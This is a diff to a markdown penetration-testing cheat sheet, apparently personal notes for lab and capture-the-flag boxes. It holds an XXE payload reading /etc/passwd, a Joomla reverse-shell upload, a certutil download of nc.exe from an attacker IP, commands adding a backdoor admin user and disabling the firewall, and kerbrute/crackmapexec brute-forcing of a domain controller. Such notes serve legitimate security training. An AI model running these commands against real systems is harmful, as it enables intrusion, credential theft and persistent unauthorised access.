@@ -122,7 +122,7 @@ chmod +s /bin/bash
 > socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080
 
 #### wpscan commands
-> 1.  ``` wpscan -e ap --rua --disable-tls-checks --detection-mode aggressive --plugins-detection aggressive --url https://xxx.xxx ```
+> 1.  ``` wpscan -e ap --rua --disable-tls-checks --detection-mode aggressive --plugins-detection aggressive -k --url https://xxx.xxx ```
 
 #### Local --- SSH Port forwarding local service 5901 (VNC) - HackMyVM Box Level
 > 1. using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
@@ -156,7 +156,7 @@ chmod +s /bin/bash
 > 1. ``` reset ```
 > 1. ``` export SHELL=bash ```
 > 1. ``` export TERM=xterm-256color ```
-> 1. ``` stty rows <num> columns <cols>; e.g stty rows 29 columns 103 ```
+> 1. ``` stty rows <num> columns <cols>; e.g stty rows 29 columns 103 stty rows 34 columns 134```
 
 > 1. **In Attacker console**
 > 1. ``` stty size ``` (to find ROWS and COLUMNS value)
@@ -165,7 +165,7 @@ chmod +s /bin/bash
 > 1. To execute a PHP script file, in command line simply type -> php <file name.php>
 > 1. to start a php based webserver, simply type -> php -S localhost:8000
   
-##### XXE injection
+#### XXE injection
 ```bash
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
@@ -193,6 +193,11 @@ chmod +s /bin/bash
 #### Cracking passwords from .pcap file
 > 1. ```aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```
 	
+#### Joomla Reverse Shell
+> 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
+> 1. https://vk9-sec.com/reverse-shell-on-any-cms/
+	
+
 #### Windws Tricks
 ##### Download a file in Windows via certutil
 > 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe
@@ -223,33 +228,40 @@ chmod +s /bin/bash
 > 1. Run winpeas with fast, searchfast or cmd options.
 > 1. Run multiple scripts e.g windows-exploit-suggester or sharup or juciy potato etc. 
 > 1. Look for exploits on -> https://github.com/SecWiki/windows-kernel-exploits
-> 1. find OS details - systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-> 1. total users present - net users
-> 1. specific user details - net user <username>
-> 1. FW status - netsh firewall show state
+> 1. find OS details - ```systeminfo | findstr /B /C:"OS Name" /C:"OS Version"```
+> 1. total users present - ```net users```
+> 1. specific user details - ```net user <username>```
+> 1. FW status - ```netsh firewall show state```
 
 ##### Windows add an Admin user from CMD
-> 1. net user /add [username] [password] ---> net user /add superadmin Superadmin123$
-> 1. net localgroup administrators [username] /add ---> net localgroup administrators superadmin
+> 1. net user /add [username] [password] ---> ```net user /add superadmin Superadmin123$```
+> 1. net localgroup administrators [username] /add ---> ```net localgroup administrators superadmin```
 
 
 ##### Windows Firewall from CMD
-> 1. FW on --- netsh advfirewall set currentprofile state on
-> 1. FW off --- netsh advfirewall set currentprofile state off
+> 1. FW on --- ```netsh advfirewall set currentprofile state on```
+> 1. FW off --- ```netsh advfirewall set currentprofile state off```
 
 ##### Windows RDP from CMD
-> 1. enable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-> 1. disable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+> 1. enable --- ```reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
+> 1. disable --- ```reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f```
 
-
-#### Joomla Reverse Shell
-> 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
-> 1. https://vk9-sec.com/reverse-shell-on-any-cms/
   
 ##### Access Windows box via xfreerdp
-> 1. xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389
+> 1. ```xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389```
+> 1. Or use Remmina for GUI 
 
-  
+ 
+
+#### Active Directory 
+> 1. Find valid usernames ```/home/jon/Downloads/kerbrute_linux_amd64 userenum --dc 192.168.10.39 -d controller.local /usr/share/seclists/Usernames/top-usernam
+es-shortlist.txt```
+> 2. Try bruteforcing password for a user ```/home/jon/Downloads/kerbrute_linux_amd64 bruteuser --dc 192.168.10.39 -d controller.local /usr/share/wordlists/rockyou.txt adminis
+trator```
+> 3. Using crackmap exec to bruteforce a user password ```crackmapexec smb 192.168.10.39 -u administrator -d controller.local -p /usr/share/wordlists/rockyou.txt```
+
+	
+##### Misc. 	
 ##### Ubuntu WSL2 on Windows 10 - SSH portforwarding to access it via Public IP
 > 1. changed following in the sudo /etc/ssh/sshd_config
   ```bash
@@ -262,14 +274,7 @@ chmod +s /bin/bash
 > 1. netsh advfirewall firewall add rule name=”Open Port 2222 for WSL2” dir=in action=allow protocol=TCP localport=2222 [ firewall]
 > 1. netsh interface portproxy show v4tov4 [ to show the entries added]
 > 1. netsh int portproxy reset all [ reset everything ]
-
-#### Active Directory 
-> 1. Find valid usernames ```/home/jon/Downloads/kerbrute_linux_amd64 userenum --dc 192.168.10.39 -d controller.local /usr/share/seclists/Usernames/top-usernam
-es-shortlist.txt```
-> 2. Try bruteforcing password for a user ```/home/jon/Downloads/kerbrute_linux_amd64 bruteuser --dc 192.168.10.39 -d controller.local /usr/share/wordlists/rockyou.txt adminis
-trator```
-> 3. Using crackmap exec to bruteforce a user password ```crackmapexec smb 192.168.10.39 -u administrator -d controller.local -p /usr/share/wordlists/rockyou.txt```
-
+	
 ### Create multiple FTP users, they do not have SSH shell and add them in same group (ftp2100). Allow this group ftp2100 to edit/upload/write to /var/www/ path
 > 1. ``` sudo echo "/bin/false" >> /etc/shells ```
 > 1. ``` sudo addgroup ftp2100 ```
